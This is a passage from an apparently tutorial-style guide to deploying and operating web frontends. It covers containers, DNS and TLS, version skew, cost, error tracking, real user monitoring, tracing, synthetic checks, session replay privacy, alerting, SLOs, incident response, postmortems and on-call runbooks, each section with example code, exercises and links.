- **Limits.** Maximum duration, request and response body size, bundle size. Check the current numbers for your plan: they change, and they differ between platforms.
- **Runtime fit.** Use edge for small, latency-sensitive logic (redirects, auth checks, personalisation, cached reads) and regional Node for anything heavy. Follow your framework's current guidance: Vercel now recommends Node.js over its Edge runtime for functions, and Next.js 16.3 removed per-route `runtime = 'edge'`.

**Try it:** Deploy a function that returns the current time and region. Call it after ten idle minutes and then again immediately, and compare `time_starttransfer` from `curl -w`. Then check your platform's limits page for max duration and body size.

**Resources**
- [Vercel docs: Functions limits](https://vercel.com/docs/functions/limitations)
- [Cloudflare Workers docs: Limits](https://developers.cloudflare.com/workers/platform/limits/)
- [Cloudflare Workers docs: How Workers works](https://developers.cloudflare.com/workers/reference/how-workers-works/)

### Containers

A container image packages your app with its runtime and dependencies so it runs identically on a laptop, in CI, and on any host (Kubernetes, Cloud Run, Fly.io, ECS). For a Node-rendered frontend, that means an image that starts your server.

A production Dockerfile for a Next.js app using `output: 'standalone'` in `next.config.js`, which emits a minimal server and only the dependencies it needs:

```dockerfile
# syntax=docker/dockerfile:1
FROM node:24-slim AS deps
WORKDIR /app
COPY package.json package-lock.json ./
RUN --mount=type=cache,target=/root/.npm npm ci

FROM node:24-slim AS build
WORKDIR /app
COPY --from=deps /app/node_modules ./node_modules
COPY . .
RUN npm run build

FROM node:24-slim AS run
WORKDIR /app
ENV NODE_ENV=production PORT=3000 HOSTNAME=0.0.0.0
COPY --from=build --chown=node:node /app/.next/standalone ./
COPY --from=build --chown=node:node /app/.next/static ./.next/static
COPY --from=build --chown=node:node /app/public ./public
USER node
EXPOSE 3000
CMD ["node", "server.js"]
```

Why it is written this way:

- **Multi-stage**: build tools and dev dependencies stay in earlier stages; the final image holds only what runs. Smaller images pull faster and have fewer vulnerabilities.
- **Layer order**: copy the lockfile and install before copying source, so the install layer is reused until dependencies change.
- **`.dockerignore`**: exclude `node_modules`, `.git`, `.next`, and `.env*` so they neither bloat the build context nor leak secrets.
- **Pinned base**: a specific Node major on a slim variant. Alpine is smaller but uses musl, which trips some native modules.
- **Non-root**: `USER node`.
- **Exec-form `CMD`**: Node runs as PID 1 and receives `SIGTERM` directly. Running through `npm start` swallows signals, so the orchestrator kills the process mid-request.
- **Config at runtime**: pass environment variables when the container starts so one image is promoted through environments. `NEXT_PUBLIC_*` values are inlined at build, so they cannot change per environment.
- **Secrets**: never `ARG` or `ENV` a secret in a build; use build secrets (`--mount=type=secret`).

Add a health endpoint for the orchestrator, handle graceful shutdown, and when running several replicas set a shared cache and a deployment ID so instances agree.

**Try it:** Build this image for a small Next.js app, run it with `docker run -p 3000:3000`, and check `docker images` for its size. Then change one source file, rebuild, and observe which layers were cached.

**Resources**
- [Docker docs: Containerize a Node.js application](https://docs.docker.com/guides/nodejs/containerize/)
- [Docker docs: Multi-stage builds](https://docs.docker.com/build/building/multi-stage/)
- [Next.js docs: Self-hosting](https://nextjs.org/docs/app/guides/self-hosting)

### Infrastructure basics

You do not need to operate this layer, but you need to follow a conversation about it and debug through it. A request for `https://app.example.com/` passes through each of these.

**DNS** turns a name into an address. The browser asks a resolver, which walks from the root to the `.com` servers to your domain's authoritative nameservers. Records you will meet: `A` and `AAAA` (name to IPv4 or IPv6 address), `CNAME` (name to another name; not allowed at the zone apex, which is why providers offer `ALIAS` or CNAME flattening), `TXT` (domain verification, email policy), `MX` (mail), and `NS` (who is authoritative). Every answer has a TTL, and resolvers cache it for that long: lower the TTL a day *before* a migration, because the old TTL governs how long the old answer survives. "DNS propagation" is just caches expiring.

**TLS certificates** prove the server controls the name and enable encryption. A certificate authority (commonly Let's Encrypt, via the ACME protocol) issues a certificate after you prove control by serving a file over HTTP or setting a DNS record. Certificates expire, with lifetimes of 90 days or less and shrinking, so renewal must be automatic; expired certificates are a classic outage. The browser validates the chain to a trusted root and that the name matches (SNI lets one IP serve many names). Add HSTS once HTTPS is reliable.

**Load balancers** spread traffic across instances and remove unhealthy ones. Layer 4 balancers forward TCP connections; layer 7 balancers understand HTTP, so they can route by host and path, terminate TLS, and add headers. Health checks decide who receives traffic, so a health endpoint that lies causes outages. Sticky sessions pin a client to one instance, which you should avoid needing by keeping servers stateless. Behind a load balancer, the client's address arrives in `X-Forwarded-For`, and idle timeouts can cut long-lived connections such as SSE and WebSockets.

On a platform such as Vercel or Cloudflare, the "load balancer" is the edge network itself, usually reached by anycast: one IP address announced from many locations.

**Try it:** Run `dig +trace app.yourdomain.com` and follow the delegation. Then run `curl -w "dns %{time_namelookup} tcp %{time_connect} tls %{time_appconnect} ttfb %{time_starttransfer}\n" -o /dev/null -s https://yourdomain.com` and explain each number.

**Resources**
- [Cloudflare Learning: What is DNS?](https://www.cloudflare.com/learning/dns/what-is-dns/)
- [Let's Encrypt: How it works](https://letsencrypt.org/how-it-works/)
- [Cloudflare Learning: What is load balancing?](https://www.cloudflare.com/learning/performance/what-is-load-balancing/)

### Asset deployment safety

Version skew is when the client and server run different versions of your app. It is not an edge case: every deploy creates it, because some users have a tab open with the old JavaScript. It also happens in the other direction during a rolling or canary release, when new HTML is served by one instance and the asset request lands on an old one.

The failures:

- **Missing chunks.** The old client navigates to a lazy-loaded route and requests `settings.a1b2c3.js`, which the new deploy removed. The result is a 404 and a `ChunkLoadError`, or worse, a 200 with the HTML fallback page, producing "Unexpected token '<'".
- **API mismatch.** The old client sends a payload the new server rejects, or cannot read a new response shape.
- **Server function or action IDs** that no longer exist in the new build.

Defences, in layers:

1. **Fingerprinted, immutable assets, and never delete old ones at deploy.** Keep previous builds' files available for days or weeks. Deploy assets before HTML.
2. **HTML that revalidates** (`Cache-Control: no-cache`), so new page loads get the new version promptly.
3. **Version pinning.** The platform routes each client's requests to the deployment that served its page. Vercel's Skew Protection does this with a deployment ID that supported frameworks attach to asset and navigation requests; self-hosted Next.js offers `deploymentId`, which makes the client detect a mismatch and do a full reload.
4. **Graceful recovery in the client.** When a dynamic import fails, reload once to pick up the new version, with a guard against loops:

```js
window.addEventListener('vite:preloadError', (event) => {
  if (sessionStorage.getItem('reloaded-for-skew')) return;
  sessionStorage.setItem('reloaded-for-skew', '1');
  event.preventDefault();
  window.location.reload();
});
```

5. **Backward-compatible APIs.** Additive changes only; support the previous client for as long as tabs live. Send the client's version in a header so the server can see what is out there.
6. **Prompt long-lived sessions to update**: poll a version endpoint and show "A new version is available", or reload on the next navigation. Take care with service workers, which can pin an old version for much longer.

Also make sure a missing asset returns a real 404 rather than your SPA's `index.html`.

**Try it:** Open your deployed app, then deploy a change that alters a lazy-loaded route. In the old tab, navigate to that route with the Network panel open. Does the chunk load, 404, or return HTML? Fix whichever failure you see.

**Resources**
- [Malte Ubl: Version skew](https://www.industrialempathy.com/posts/version-skew/)
- [Vercel docs: Skew Protection](https://vercel.com/docs/skew-protection)
- [Vite docs: Load error handling](https://vite.dev/guide/build#load-error-handling)

### Cost awareness

Usage-billed platforms charge for a handful of meters. Knowing which ones your architecture drives lets you predict the bill and notice when a change triples it.

- **Bandwidth (data transfer).** Bytes sent to users. Driven by large images and video, uncompressed responses, and low cache hit rates. Bots and hotlinking count too. Fix with image optimisation, compression, long-lived immutable caching, and moving heavy media to storage built for it.
- **Requests.** Many platforms bill per edge request. Chatty pages, aggressive polling, and prefetching every link add up.
- **Function compute.** Invocations and duration, measured as wall-clock GB-seconds or, increasingly, active CPU time plus provisioned memory. Driven by rendering pages on every request that could be cached or static, slow upstream calls on wall-clock billing, and middleware that runs on every request including assets. Fix with caching and static generation, narrowing middleware matchers, and setting sensible max durations so a hung call cannot run for minutes.
- **Builds.** Build minutes and concurrency. Driven by building every app on every push in a monorepo and by preview builds for bot PRs. Fix with affected-only builds and build caching.
- **Add-on meters.** Image transformations, ISR or data cache writes, analytics events, log drains, observability events, and seats.

Pricing models change often and differ by platform (Netlify moved to a credit-based model; Vercel bills functions by active CPU and memory and offers flat-rate CDN tiers), so read the current pricing page rather than relying on memory, then map your own traffic onto it: monthly page views times requests per view times bytes per view.

Habits that prevent surprises:

- Set spend limits and budget alerts on day one.
- Check the usage dashboard after each significant launch, by meter and by route.
- Treat cache hit ratio as a cost metric.
- Watch for runaway loops: a client retrying without backoff, an effect refetching on every render, a webhook calling itself.
- Have a plan for abusive traffic (rate limiting, firewall rules, challenge pages), because a DDoS on a usage-billed origin is also a billing event.
- Sample telemetry and replays; observability products bill per event too.

Cost is an engineering trade-off like performance. Usually the same change (cache more, ship fewer bytes, render less per request) improves both.

**Try it:** Open the usage page of a project you host. Identify the largest meter, find the route or asset contributing most to it, and estimate what a 10x traffic spike would cost at current rates.

**Resources**
- [Vercel docs: Pricing](https://vercel.com/docs/pricing)
- [Cloudflare Workers docs: Pricing](https://developers.cloudflare.com/workers/platform/pricing/)
- [Vercel docs: Manage and optimize usage](https://vercel.com/docs/pricing/manage-and-optimize-usage)

### Error tracking

Users do not report most errors; they leave. An error tracker (Sentry is the common choice; Bugsnag, Rollbar, and Datadog work similarly) captures uncaught exceptions and unhandled promise rejections from real browsers, with stack trace, browser, URL, user actions leading up to the error, and the release.

Four things make it useful rather than noisy.

**Source maps.** Production stack traces point into minified code. Upload source maps at build time so the tracker can show original files and lines. Generate them as "hidden" (no `sourceMappingURL` comment), upload, and remove them from the deployed output so they are not public:

```js
// vite.config.js
import { defineConfig } from 'vite';
import { sentryVitePlugin } from '@sentry/vite-plugin';

export default defineConfig({
  build: { sourcemap: 'hidden' },
  plugins: [
    sentryVitePlugin({
      org: 'acme',
      project: 'web',
      authToken: process.env.SENTRY_AUTH_TOKEN,
      release: { name: process.env.GITHUB_SHA },
      sourcemaps: { filesToDeleteAfterUpload: ['dist/**/*.map'] },
    }),
  ],
});
```

Sentry matches bundles to maps with debug IDs injected into both, so matching no longer depends on file paths lining up.

**Release tagging.** Set `release` (the commit SHA) and `environment` in `Sentry.init`. Then you can see which deploy introduced an issue, mark an issue as resolved in a release so a recurrence reopens it as a regression, and compare crash-free sessions between releases. This is what makes canary analysis possible.

**Grouping.** Events are grouped into issues by fingerprint, mainly the stack trace. Poor grouping gives either one issue hiding ten bugs or one bug spread over a hundred issues. Throw real `Error` objects with stable messages (put variable data in context, not in the message) and set custom fingerprints where needed.

**Alerts and noise.** Alert on new issues, regressions, and spikes in error rate, not on every event. Filter what you cannot act on: browser extensions, known third-party script errors, bots, and "Script error." from cross-origin scripts without CORS headers. Ignore deliberately, in config, with a comment.

Add context: user ID (not personal data), route, feature flags, and breadcrumbs. Catch errors in React error boundaries and report them, since boundaries stop them reaching the global handler. Triage on a schedule and assign owners.

**Try it:** Add a button that throws to a deployed app with error tracking. Confirm the event shows an un-minified stack trace, the correct release, and breadcrumbs for your click. Then deploy again and check the release changed.

**Resources**
- [Sentry docs: Source maps for JavaScript](https://docs.sentry.io/platforms/javascript/sourcemaps/)
- [Sentry docs: Releases](https://docs.sentry.io/product/releases/)
- [Sentry docs: Issue grouping](https://docs.sentry.io/concepts/data-management/event-grouping/)

### Real user monitoring

Real user monitoring (RUM) measures performance in your users' browsers, on their devices and networks. Lab tools such as Lighthouse run one page load on one simulated device; they are for debugging. Field data tells you what users actually experience, and it is what Core Web Vitals are judged on.

Collect the Web Vitals with the `web-vitals` library, which handles the edge cases (back/forward cache, background tabs, final values at page hide):

```js
import { onCLS, onINP, onLCP } from 'web-vitals/attribution';

function send(metric) {
  const body = JSON.stringify({
    name: metric.name,
    value: metric.value,
    rating: metric.rating,
    id: metric.id,
    navigationType: metric.navigationType,
    route: window.__ROUTE_PATTERN__, // e.g. "/products/[id]", not the raw URL
    release: window.__RELEASE__,
    target: metric.attribution.interactionTarget ?? metric.attribution.largestShiftTarget ?? null,
  });
  if (!navigator.sendBeacon?.('/rum', body)) {
    fetch('/rum', { method: 'POST', body, keepalive: true });
  }
}

onLCP(send);
onINP(send);
onCLS(send);
```

How to read the data:

- **Percentiles, not averages.** The standard is the 75th percentile: good means LCP at or under 2.5 s, INP at or under 200 ms, CLS at or under 0.1 for 75% of page views.
- **Segment.** An overall number hides everything. Slice by route pattern (group URLs, or you get one bucket per product ID), device class, connection type, country, and release. Problems are nearly always concentrated in one segment.
- **Attribution.** The attribution build tells you *which* element was the LCP, which interaction was slow and where the time went (input delay, processing, presentation), and which element shifted. Without it you know there is a problem but not where.
- **By release.** Tagging with the release lets you see a regression in the hour after a deploy.

Add custom metrics for what matters to your product (time to first search result, time until the editor is interactive) using `performance.mark()` and `performance.measure()`.

Practicalities: sample if volume is high, but not so much that small segments vanish; send on `visibilitychange` to hidden, which the library does for you; do not put personal data in the payload; and remember some APIs are not available in every browser, so check support before comparing across browsers. Platform products (Vercel Speed Insights, Cloudflare Web Analytics, Sentry, Datadog RUM) collect the same data without your own endpoint.

**Try it:** Add the snippet above to a page with `send` replaced by `console.log`. Interact with the page, then switch tabs to trigger the final reports. Read the `attribution` object for INP and identify the element and the longest phase.

**Resources**
- [web.dev: Best practices for measuring Web Vitals in the field](https://web.dev/articles/vitals-field-measurement-best-practices)
- [GoogleChrome/web-vitals README](https://github.com/GoogleChrome/web-vitals)
- [web.dev: Debug performance in the field](https://web.dev/articles/debug-performance-in-the-field)

### Logging and tracing

When a user says "saving failed", you need to connect their click to what happened in every service behind it. Logs tell you what one component did; a distributed trace connects the work done across components for one request.

A **trace** is a tree of **spans**. Each span is one unit of work (an HTTP request, a database query) with a start time, a duration, and attributes. All spans in a trace share a trace ID. The link between browser and backend is **context propagation**: the browser sends the W3C `traceparent` header with its requests, and each service continues the same trace.

```http
traceparent: 00-4bf92f3577b34da6a3ce929d0e0e4736-00f067aa0ba902b7-01
```

The fields are version, trace ID (32 hex characters), parent span ID (16 hex characters), and flags (`01` means sampled).

In practice an SDK does this for you. Sentry's browser tracing integration and OpenTelemetry's fetch instrumentation create a span for each request and attach the header. Two things you must configure yourself:

- **Which origins receive the header.** Limit propagation to your own API origins (`tracePropagationTargets` in Sentry, `propagateTraceHeaderCorsUrls` in OpenTelemetry). Sending it to third parties leaks identifiers and can break their CORS.
- **CORS.** For cross-origin API calls the backend must list `traceparent` (and `tracestate`, or the vendor's header) in `Access-Control-Allow-Headers`, or the preflight fails.

Then tie everything to the trace ID: put it on error reports, show a short request or trace ID in user-facing error messages so support can look it up, and include it in every server log line. With that, an error in the browser leads directly to the slow query that caused it.

Logging on the server should be structured (JSON with level, message, trace ID, route, release) so it can be queried. On the client, do not ship `console.log` output wholesale; send breadcrumbs with errors and a small number of deliberate events. Never log tokens, passwords, or personal data.

For quick diagnostics without a tracing backend, the `Server-Timing` response header lets the server report phase durations that appear in DevTools' Network Timing tab and in `PerformanceResourceTiming`.

OpenTelemetry is the vendor-neutral standard and is solid on the server; its browser instrumentation is still marked experimental, so many teams use a vendor SDK in the browser and OpenTelemetry behind it. Sample traces (for example 10%) to control cost.

**Try it:** With tracing enabled in your app, open the Network panel, select an API request, and find the `traceparent` request header. Copy the trace ID and find the same trace in your backend's tracing or logs.

**Resources**
- [W3C: Trace Context](https://www.w3.org/TR/trace-context/)
- [OpenTelemetry docs: Context propagation](https://opentelemetry.io/docs/concepts/context-propagation/)
- [MDN: Server-Timing header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Server-Timing)

### Synthetic monitoring

Synthetic monitoring runs scripted checks against production on a schedule, from known locations, whether or not any user is active. It complements RUM: RUM tells you what real users experienced, but only when there are users and only after they hit the problem. Synthetic checks catch the 3am outage before the first customer, and give a clean, comparable baseline because the device, network, and script never change.

Three kinds, in increasing cost:

1. **Uptime checks**: request a URL every minute and assert on status code, a string in the body, and response time. Also check certificate expiry.
2. **API checks**: call key endpoints and assert on the response shape.
3. **Browser checks**: a real browser runs a critical flow (log in, search, add to cart, reach checkout) with Playwright:

```ts
import { test, expect } from '@playwright/test';

test('visitor can search and open a product', async ({ page }) => {
  await page.goto('https://www.example.com/');
  await page.getByRole('searchbox', { name: 'Search' }).fill('trail shoes');
  await page.keyboard.press('Enter');
  await page.getByRole('link', { name: /trail/i }).first().click();
  await expect(page.getByRole('button', { name: 'Add to cart' })).toBeVisible();
});
```

Run it from a monitoring service (Checkly, Datadog Synthetics, Grafana k6) or, as a starting point, a scheduled CI workflow. CI schedulers are not precise or guaranteed, so do not rely on them for anything that pages someone.

Design rules:

- **Cover few flows, the ones that earn money or block everything.** Five reliable checks beat fifty flaky ones.
- **Use dedicated test accounts and data**, clean up after writes, and exclude synthetic traffic from analytics and RUM.
- **Do not complete real side effects**: stop before payment, or use the provider's test mode.
- **Reduce false alarms**: retry once, require failure from two locations before alerting, and write resilient selectors (roles and labels).
- **Run from where your users are**, since CDN and DNS problems are regional.
- **Alert with evidence**: screenshot, trace, and the failing step.

Synthetic checks also work as performance regression tests: run Lighthouse CI against preview or production with budgets and track lab metrics per release. Just remember that lab results from one fast machine say little about what your slowest users see.

**Try it:** Write a Playwright test for the single most important flow of an app you run, pointed at production with a test account. Run it on a 15-minute schedule in CI for a day and count false failures. Fix the cause of each.

**Resources**
- [Playwright docs: Continuous integration](https://playwright.dev/docs/ci)
- [Checkly docs](https://www.checklyhq.com/docs/)
- [web.dev: Why lab and field data can be different](https://web.dev/articles/lab-and-field-data-differences)

### Session replay

Session replay reconstructs what a user saw and did. It does not record video: the SDK serialises the DOM, then records mutations, pointer movement, scrolls, and input events, and the viewer replays them. Linked to an error or a support ticket, it replaces "cannot reproduce" with watching the bug happen, along with console output and network requests.

Its value for debugging is high and so is its privacy risk. Without care, a replay captures names, addresses, messages, health or financial details, and anything typed into a form. Treat it as personal data processing.

Rules for using it responsibly:

- **Mask by default, reveal by exception.** Sentry's replay masks all text and input values and blocks media by default. Keep that, and unmask only specific elements you know are safe. A blocklist approach ("mask the sensitive fields") fails the first time someone adds a new field.
- **Mark sensitive regions in markup** so protection travels with the component: Sentry honours `data-sentry-mask` (replace text), `data-sentry-block` (replace the element with a placeholder), and `data-sentry-ignore` (drop input events).
- **Network bodies stay off** unless you allowlist specific safe endpoints. Request and response bodies carry the same data you masked on screen.
- **Sample deliberately.** Record sessions with errors rather than everything:

```js
Sentry.init({
  dsn: 'https://examplePublicKey@o0.ingest.sentry.io/0',
  integrations: [Sentry.replayIntegration()],
  replaysSessionSampleRate: 0,
  replaysOnErrorSampleRate: 1.0,
});
```

With this, the SDK buffers the last moments in memory and uploads only if an error occurs.

- **Consent and law.** Depending on jurisdiction and your privacy policy, you may need consent before recording. Involve whoever owns privacy, document the purpose, and load the integration only after consent where required.
- **Retention and access.** Short retention, restricted access, and an audit of who views replays.
- **Verify.** Watch replays of your own forms and confirm nothing sensitive is visible. Masking can miss text rendered in `<canvas>`, in pseudo-elements, or inside cross-origin iframes.

There is a performance cost as well: mutation recording adds main-thread work and upload bytes, which matters on pages with heavy DOM churn. Lazy-load the integration and measure INP with and without it.

**Try it:** Enable replay on a test deployment with default masking, fill in a form, trigger an error, and watch the replay. List everything visible that you would not want a colleague to see, then fix it with masking attributes.

**Resources**
- [Sentry docs: Session Replay privacy](https://docs.sentry.io/platforms/javascript/session-replay/privacy/)
- [Sentry docs: Set up Session Replay](https://docs.sentry.io/platforms/javascript/session-replay/)

### Dashboards and alerts

Dashboards are for looking; alerts are for interrupting. Most teams have too many of both, and the result is that real problems are missed in the noise.

**Alerts.** An alert should fire only when a human must act now. Before adding one, answer: is it about something users experience, is it urgent, is there a clear action, and will it be right most of the time? Alert on **symptoms** (users cannot check out, the error rate on the product page tripled, LCP at p75 doubled after a release), not on **causes** (CPU is high, one request failed). Causes belong on dashboards, where they help you diagnose after a symptom alert.

Useful frontend alerts:

- JavaScript error rate or crash-free sessions dropping, compared with the previous release.
- A new high-volume error issue after a deploy.
- 5xx or failed-request rate on critical API calls as seen from the browser.
- A synthetic check of a critical flow failing from two locations.
- p75 LCP or INP regressing beyond a threshold on key routes.
- A business signal falling outside its normal band (checkouts per minute).

Make them robust: use rates rather than counts so they scale with traffic, require the condition to hold for a few minutes, and use burn-rate alerts against an SLO where you have one. Separate severities: page for user-facing emergencies, open a ticket for things that can wait until morning. Every alert links to a runbook and has an owner. Review alerts regularly: one that fired and required no action gets tuned or deleted. Alert fatigue is how real pages get ignored.

**Dashboards.** Build one overview that answers "are users OK right now?" in a few seconds: traffic, error rate, latency, and Core Web Vitals, with deploy markers on every chart so regressions line up with releases. Google's four golden signals (latency, traffic, errors, saturation) are a sound starting set for services; for a frontend add Web Vitals and a conversion metric. Then build drill-down dashboards per area for diagnosis. Show percentiles rather than averages, keep time axes aligned, and delete charts nobody looks at.

**Try it:** List every alert your team received last week. Mark each as "acted on", "ignored", or "informational". For the last two groups, decide: delete, downgrade to a ticket, or fix the threshold.

**Resources**
- [Google SRE Book: Monitoring distributed systems](https://sre.google/sre-book/monitoring-distributed-systems/)
- [Google SRE Workbook: Alerting on SLOs](https://sre.google/workbook/alerting-on-slos/)
- [Sentry docs: Alerts](https://docs.sentry.io/product/alerts/)

### SLOs

A service level objective is a target for how reliable something should be, expressed so it can be measured. It turns "the site should be fast and up" into a number a team can make decisions with.

Three terms:

- **SLI (indicator)**: a measurement of user experience, best expressed as a ratio of good events to valid events. "Proportion of page loads with LCP at or under 2.5 s."
- **SLO (objective)**: the target for the SLI over a window. "90% of product page loads have good LCP over 28 days."
- **SLA (agreement)**: a contractual promise with consequences. Usually looser than the SLO.

For a frontend, server uptime is a poor SLI: the server can return 200 while the page is blank because a script failed. Measure from the user's side:

- **Availability**: sessions without a fatal error (crash-free sessions), or successful completion of a critical journey; successful API requests as seen from the browser.
- **Performance**: proportion of page views with good LCP, good INP, good CLS, per key route.
- **Correctness or freshness** where relevant.

The **error budget** is what makes SLOs useful. A target of 99.9% allows 0.1% failure. Over 30 days that is about 43 minutes of full unavailability, or one bad request in every thousand. While budget remains, ship quickly. When it is spent, reliability work takes priority over features. This replaces arguments about "is it stable enough" with arithmetic, and it is also why 100% is the wrong target: it leaves no room to change anything, and users cannot tell 99.99% from 100% through their own network.

Alert on **burn rate**: how fast the budget is being consumed. A burn rate of 1 uses the budget exactly over the window. For a 30-day window, a burn rate of 14.4 sustained for one hour consumes 2% of the month's budget, a commonly used paging threshold; a slower burn opens a ticket.

Setting them: pick two or three journeys that matter, measure current performance for a few weeks, set the target slightly below what you already achieve, and agree in advance what happens when the budget runs out. Start with few SLOs; revise them when they turn out to be wrong.

**Try it:** Define one availability SLO and one performance SLO for an app you work on, each as "X% of [events] are [good] over [window]". Compute the error budget in events per month from real traffic numbers.

**Resources**
- [Google SRE Book: Service level objectives](https://sre.google/sre-book/service-level-objectives/)
- [Google SRE Workbook: Implementing SLOs](https://sre.google/workbook/implementing-slos/)
- [Google SRE Book: Embracing risk](https://sre.google/sre-book/embracing-risk/)

### Incident response

An incident is any unplanned event that degrades the service for users and needs a coordinated response. The order of operations is what separates a short incident from a long one: **triage, mitigate, communicate, then fix.**

**Triage.** Establish impact before cause. Who is affected (everyone, one browser, one region, logged-in users)? What can they not do? Since when? What changed around that time (a deploy, a flag, a config change, a third-party outage, a certificate expiry)? Assign a severity, because it determines who is called and how often you update.

**Mitigate first.** Restore service by the fastest safe route, before you understand the root cause. Roll back the deploy, turn off the flag, fail over, shed load, or put up a degraded mode. The strongest temptation, especially for the person who wrote the code, is to debug forward and push a fix. Resist it: a rollback takes a minute and is known to work; a hot fix written under pressure is untested code on a broken system. If a deploy happened shortly before the symptoms began, roll back and investigate afterwards. Capture evidence (error IDs, screenshots, logs) on the way, but do not delay mitigation for it.

**Communicate.** Declare the incident in one channel. Assign roles even in a small team: an incident commander who coordinates and decides (and does not debug), people working the problem, and someone handling communication. Post short updates at a fixed interval: what we know, what we are doing, when the next update is. Update the status page and support team in plain language. Silence reads as "nobody is on it".

**Fix.** Once users are no longer affected, find the cause at normal working pace, fix it properly with review and tests, and re-release with care.

Keep a timestamped log throughout. Hand over explicitly if the incident outlasts a person's attention. Close it deliberately: confirm metrics are back to normal, announce resolution, and schedule the postmortem.

Frontend-specific things to check in triage: does it reproduce in a private window (stale cache or service worker), is it one browser or version, did a third-party script or CDN change, is it a version-skew problem right after a deploy, and is the CDN serving a cached error.

**Try it:** Write a one-page incident checklist for your team: severity definitions, the channel, the roles, the update interval, and the exact rollback command. Then walk through it against a past outage and note where it would have saved time.

**Resources**
- [Google SRE Book: Managing incidents](https://sre.google/sre-book/managing-incidents/)
- [PagerDuty Incident Response documentation](https://response.pagerduty.com/)
- [Google SRE Workbook: Incident response](https://sre.google/workbook/incident-response/)

### Debugging production

Production bugs arrive as vague reports ("the page is broken") from an environment you do not control. The skill is turning that into a reproduction, using evidence rather than guesses.

**Gather the facts.** What exactly happened and what was expected; URL; time (with timezone); account; browser, version, and device; whether it happens every time; a screenshot or the on-screen error ID. Build a support template that asks for these, and show a request or trace ID in error messages so the user can quote it.

**Find the event in your tools.** Search the error tracker by user, URL, or time. Read the stack trace (source-mapped), the breadcrumbs (clicks, navigations, console, requests before the error), and the tags: release, browser, feature flags. Watch the session replay if you have one. Follow the trace ID into backend logs.

**Look for the pattern.** One user or many? One browser? One release, starting at a particular deploy? One region, one flag variant, one account type, one data shape? The discriminating factor is usually the answer. "Only Safari, only since release abc123" narrows the search to the diff of that release and features Safari handles differently.

**Reproduce.** Match the conditions: same browser and version (use real devices or a device cloud for mobile Safari), same account type and data, same flags, throttled network and CPU, same locale and timezone, with extensions disabled and then enabled. Check the usual production-only causes: minification or build differences, environment configuration, cached old assets or service workers, version skew after a deploy, third-party scripts and consent banners, content security policy, ad blockers, real-world data (empty, huge, unusual characters), race conditions that only appear on slow networks, and clock or timezone differences.

**Debug in place when needed.** Chrome DevTools can load source maps you supply locally for a production bundle, and local overrides let you run a modified script or mocked response against the production page without deploying. Add targeted logging behind a flag if the evidence is insufficient, then remove it.

**Close the loop.** Write the failing test first, fix, verify in production with the same evidence that showed the bug, and tell the reporter.

Never debug by logging in as the customer without a controlled, audited impersonation feature, and never copy production personal data to your machine.

**Try it:** Take a resolved issue from your error tracker and, using only the event (stack trace, breadcrumbs, tags), write the reproduction steps before reading the fix. Compare with what the fixer found.

**Resources**
- [Chrome DevTools: Debug your original code with source maps](https://developer.chrome.com/docs/devtools/javascript/source-maps)
- [Chrome DevTools: Override web content and HTTP response headers locally](https://developer.chrome.com/docs/devtools/overrides)
- [Sentry docs: Session Replay](https://docs.sentry.io/platforms/javascript/session-replay/)

### Postmortems

A postmortem is a written analysis of an incident, produced after it is resolved, whose purpose is learning: understanding how the system, including its people and processes, allowed the incident to happen, and changing the system so it is less likely or less harmful next time.

**Blameless** is the essential property. It assumes people acted reasonably given what they knew, the tools they had, and the pressure they were under. "Sam deployed a bad config" teaches nothing and guarantees that next time people hide what happened. "The config change was deployed without validation because the pipeline has no schema check, and the reviewer could not see the rendered diff" identifies things you can fix. Blameless does not mean without accountability: the team is accountable for the follow-ups.

A good write-up contains:

1. **Summary**: two or three sentences a non-engineer can follow.
2. **Impact**: who was affected, for how long, how badly, with numbers (failed checkouts, error rate, revenue, support tickets).
3. **Timeline**: timestamped events from the first trigger through detection, escalation, mitigation, and resolution. Take it from the incident log, not memory.
4. **Detection**: how you found out, and how long that took. If a customer told you, that is a finding.
5. **Root causes and contributing factors**: usually several. Keep asking "why was that possible?" beyond the first answer, into process and tooling.
6. **What went well, what went badly, where you were lucky.**
7. **Action items**: each one specific, with an owner, a due date, and a tracked ticket. Prefer changes that make the error impossible or detectable (a CI check, a canary, an alert) over "be more careful" or "add documentation".

Process: write it within a few days while memory is fresh; have someone outside the response review it; hold a short review meeting; publish it where the whole engineering organisation can read it. Then track action items to completion, because a postmortem whose actions are never done is theatre, and repeat incidents with the same cause are the sign.

Look for recurring themes across postmortems. Three incidents caused by version skew is an architecture problem, not three unlucky days. Write postmortems for near misses too: they are cheaper lessons.

**Try it:** Read the example postmortem in the Google SRE book. Then write a one-page postmortem for a bug you shipped, using the structure above, with at least one action item that would have prevented it mechanically and one that would have detected it sooner.

**Resources**
- [Google SRE Book: Postmortem culture](https://sre.google/sre-book/postmortem-culture/)
- [Google SRE Book: Example postmortem](https://sre.google/sre-book/example-postmortem/)
- [PagerDuty: Postmortem documentation](https://postmortems.pagerduty.com/)

### On-call readiness

Being on-call means you are the person who responds when an alert fires, possibly at 3am, possibly for code you did not write. Readiness is whatever lets a tired engineer with partial context restore service safely. It is prepared in advance, not improvised.

**Access, checked before the shift.** Can you log in to the hosting platform, error tracker, monitoring, feature flag service, DNS and CDN dashboards, and the paging tool, from the laptop and network you will have? Do you have permission to roll back and to change flags? Expired credentials discovered mid-incident are a common and avoidable delay.

**Runbooks.** A runbook is a short document linked from an alert that says what the alert means, how to confirm it, what to do first, and whom to escalate to. Write it for someone who has never seen the system:

```md
## Alert: checkout error rate above 5%

Meaning: more than 5% of checkout page views raised an unhandled error (5 min window).
Check: Sentry > project web > filter by release. Dashboard "Checkout health".
First action: if a deploy went out in the last 60 minutes, roll back:
    vercel rollback
  Or disable the flag `new-checkout` in the flags dashboard.
Verify: error rate under 1% within 5 minutes; synthetic "checkout" check passes.
Escalate: #payments-oncall, then the engineering manager on the rota.
```

Commands must be copy-pasteable and tested. A runbook that was never run is a guess.

**The rollback, memorised.** Know exactly how to return to the last good version and how to switch off a flag, without looking anything up. Practise both in daylight.

**Knowing the limits.** Mitigate; do not attempt heroic fixes at night. Escalate early when out of your depth. That is the system working, not a failure.

**A sustainable rota.** A primary and a secondary, clear handovers with notes on anything in flight, time off after a night incident, and a manageable alert volume. If the pager fires for things that need no action, fix the alerts: fatigue makes people miss the real one.

**Onboarding.** New people shadow a shift, then lead with a shadow behind them, and take part in a game day before going solo.

Frontend teams are sometimes left off the rota because "the frontend cannot go down". It can: a bad deploy, an expired certificate, a failed third-party script, or a CDN misconfiguration all take the product down for users while every server stays green.

